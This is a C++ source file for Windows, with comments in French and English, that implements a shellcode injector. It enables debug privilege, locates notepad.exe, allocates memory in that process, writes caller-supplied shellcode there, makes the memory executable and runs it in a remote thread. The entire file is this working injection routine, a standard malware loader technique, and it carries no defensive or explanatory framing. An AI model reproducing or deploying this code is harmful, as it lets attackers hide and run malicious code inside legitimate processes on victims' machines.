#include "memory_handler.h"
#include <windows.h>
#include <iostream>
#include <tlhelp32.h> // Pour utiliser CreateToolhelp32Snapshot et Process32First/Next


void EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }
}


bool inject_shellcode(const char* shellcode, size_t size) {
    EnableDebugPrivilege(); // Ensure debug privileges are enabled

    // Find "notepad.exe"    
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Erreur lors de la capture du snapshot des processus" << std::endl;
        return false;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;
    if (Process32First(hProcessSnap, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, L"notepad.exe") == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &processEntry));
    }

    CloseHandle(hProcessSnap);

    if (pid == 0) {
        std::cerr << "Notepad.exe non trouvé" << std::endl;
        return false;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Impossible d'ouvrir le processus Notepad.exe" << std::endl;
        return false;
    }

    // Allocate memory in the target process
    LPVOID execMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) {
        std::cerr << "Erreur lors de l'allocation de mémoire dans le processus" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the shellcode to the target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, execMem, shellcode, size, &bytesWritten)) {
        std::cerr << "Erreur lors de l'écriture du shellcode dans la mémoire du processus" << std::endl;
        VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Change memory permissions to executable
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, execMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur lors du changement de la protection de la mémoire" << std::endl;
        VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    //// Validate memory protection
    //MEMORY_BASIC_INFORMATION mbi;
    //if (!VirtualQueryEx(hProcess, execMem, &mbi, sizeof(mbi)) || !(mbi.Protect & PAGE_EXECUTE)) {
    //    std::cerr << "La mémoire allouée n'a pas les bonnes permissions d'exécution !" << std::endl;
    //    VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
    //    CloseHandle(hProcess);
    //    return false;
    //}

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        DWORD errorCode = GetLastError();
        std::cerr << "Erreur lors de la création du thread distant, Code d'erreur : " << errorCode << std::endl;
        VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    //// Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    std::cout << "Code de sortie du thread : " << exitCode << std::endl;

    // Clean up
    VirtualFreeEx(hProcess, execMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

